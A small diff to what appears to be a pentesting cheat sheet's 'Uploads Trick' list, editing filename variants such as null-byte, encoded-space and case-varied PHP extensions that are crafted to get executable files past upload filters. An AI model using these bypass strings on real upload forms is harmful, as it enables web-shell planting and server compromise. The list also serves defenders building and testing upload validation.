@@ -6,9 +6,9 @@ Uploads Trick :
 =============
 - .php<?.jpg
 - .php%00.jpg
-- .php.0x00.jpg
-- .php.%20.jpg
-- .php.%2F.jpg
+- .php0x00.jpg
+- .php%20.jpg
+- .php%2F.jpg
 - .php">.jpg
 - .PhtML<reverse>
 - .PHar<reverse>
